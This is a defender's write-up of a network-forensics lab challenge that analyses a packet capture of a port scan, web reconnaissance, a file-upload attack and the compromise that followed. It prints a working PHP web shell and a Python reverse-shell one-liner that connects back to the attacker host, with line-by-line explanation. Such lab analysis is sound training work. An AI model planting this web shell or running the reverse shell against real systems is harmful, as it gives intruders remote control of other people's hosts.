# Network Analysis - Portscanning BLTO challenge

## Alert
The SOC team received an alert in their SIEM for Local to Local
port scanning where an internal private IP began scanning another internal system.

## Prerequisites
The pcap captures every byte of network traffic, which also includes the malware.
To isolate and mitigate risk I will be spinning up a Kali-Linux virtual machine to investigate the pcap.
- Wireshark - for network analysis
- Packet Capture - network traffic for investigation
- KaliLinux-VM - For isolated investigation

## Core Investigation
To start off I got notice about the file I were to investigate were infected.
This information led me to spinning up my KaliLinux virtual machine and running the investigation through there.
My first goal was to identify the IP responsible for port scanning, and I did this by:
- Went to `statictics -> conversations -> TCP`.
  - The pattern was clear the IP-adress **10.251.96.4** had incrementally made requests to port
    **1 through 1024**.
    Another clear pattern that confirmed my suspicion, was the size of all the request were **1 packet**,
    which is a deliberate small packet-size with no other purpose than finding open ports.

## SYN Scan
Next up I wanted to identify the type of port scan conducted by the attacker.
To do this I started by filtering the network-traffic with `tcp.flags.syn==1 and tcp.flags.ack==0`.
This shows me the requests that sent a SYN but never finished actually finished the 3 way handshake with ACK.
By this I could clearly see this was a TCP **SYN scan**, this is often used because it is slightly faster than a full handshake, and older detection methods can overlook this type.

## Tools used for reconnaissance on open ports
To identify which tools were used on the open ports, to do this we will look at **User Agent Strings** which
often leaves a signature of whichever tool it comes from. We use this 
filter `ip.dst == 10.251.96.5 && http.user_agent` this gives us only the requests made to the target IP,
and the ones who contains User Agent Strings, from we just take a look at some of the requests and its HTTP information, where it tells us **gobuster 3.0.1** and **sqlmap 1.4.7** had been used. 

## php file which the attacker uploaded a web shell
When information is sent to a website, is it through **Http Posts** requests.
This means the we can filter the traffic by `http.request.method==POST`, and after some searching 
we find php mentioned. From the outside we cannot determine the plaintext of the file uploaded which is **editprofile.php**, if we follow the TCP stream, in that window we can see clearly stated 
"`The file dbfunctions.php has been uploaded`".

```
<?php
if(isset($_REQUEST['cmd']) ){
echo "<pre>";
$cmd = ($_REQUEST['cmd']);
system($cmd);
echo "</pre>";
die;
}
?>
```
From this file uploaded to act as a webshell we can clearly see that following GET requests to this file,
will be executed as commands **cmd**. 

## Figuring out which commands has been run
As we discussed before, all following GET requests from the source IP to the file will be commands.
This means if we use this filter `ip.src==10.251.96.4 && http.request.method==GET`, to filter the source IP,
and its GET requests. Almost immidiately we can see the fist command executed was
`id` with `whoami` and a pythonscript which we have not yet figured out what does.


## What type of shell connection
We just established which commands had been run, now we need to identify exactly what this mysterious
python script does.
```python
GET /uploads/dbfunctions.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.251.96.4%22,4422));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27 HTTP/1.1


# Decoded script
import socket, subprocess, os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Opens TCP socket
s.connect(("10.251.96.4", 4422)) # Connect to IP-adress

os.dup2(s.fileno(), 0) # Rewire keyboard-input to point at the socket
os.dup2(s.fileno(), 1) # Rewire screen-output to point at the socket
os.dup2(s.fileno(), 2) # Rewire screen-error-output to point at the socket

# Spawns interactive shell - I/O bound to socket = attacker's listeners becomes the shell on the host.
p = subprocess.call(["/bin/sh", "-i"])
```
In short its a reverse shell, that rewires the I/O to the socket, making the attackers listeners act as a shell on the host, and the port he uses for the shell connection is **4422**
